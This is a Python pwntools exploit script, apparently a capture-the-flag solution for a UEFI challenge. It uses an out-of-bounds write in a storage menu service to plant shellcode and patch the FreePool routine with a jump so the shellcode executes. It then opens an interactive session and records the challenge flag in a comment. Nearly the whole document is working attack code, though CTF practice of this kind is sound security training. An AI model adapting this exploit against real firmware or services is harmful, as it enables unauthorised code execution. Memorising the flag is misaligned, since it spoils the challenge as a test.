#!/usr/bin/env python3
from pwn import *


def connect():
    return remote("uefi.shared.challs.mt", 1337)
    return process(["./run2.sh"])


def prompt(tube, choice):
    tube.recvuntil(b"make a decision: ")
    time.sleep(0.1)
    tube.send(choice)


def create_storage(tube, size):
    prompt(tube, b"1\r")
    tube.recvuntil(b"STORAGE size: ")
    time.sleep(0.1)
    tube.send(str(size).encode() + b"\r")


def resize_storage(tube, index, size):
    prompt(tube, b"2\r")
    tube.recvuntil(b"STORAGE size: ")
    time.sleep(0.1)
    tube.send(str(size).encode() + b"\r")
    tube.recvuntil(b"STORAGE index: ")
    time.sleep(0.1)
    tube.send(str(index).encode() + b"\r")


def edit_storage(tube, index, offset, data):
    prompt(tube, b"4\r")
    tube.recvuntil(b"STORAGE index: ")
    time.sleep(0.1)
    tube.send(str(index).encode() + b"\r")
    tube.recvuntil(b"STORAGE offset: ")
    time.sleep(0.1)
    tube.send(str(offset).encode() + b"\r")
    tube.recvuntil(b"STORAGE data: ")
    time.sleep(0.1)
    tube.send(data)


def main():
    with connect() as tube:
        create_storage(tube, 1)
        attacker_ptr = 0x282D020
        free_pool = 0x3E93812
        with open("shellcode.bin", "rb") as fp:
            shellcode = fp.read()
        shellcode_addr = 0x3E9385C
        resize_storage(tube, 0, shellcode_addr + len(shellcode) - attacker_ptr)
        edit_storage(
            tube, 0, shellcode_addr - attacker_ptr, shellcode.hex().upper().encode()
        )
        # overwrite
        #    0x3e93812:	push   %rbp
        #    0x3e93813:	mov    %rsp,%rbp
        # with
        #    0x3e93812:	jmp    0x3e9385c
        edit_storage(tube, 0, free_pool - attacker_ptr, b"EB" * 32)
        # free_pool will be called during editing
        tube.interactive()
        # maltactf{never_underestimate_the_power_of_the_scouts_code}


if __name__ == "__main__":
    main()
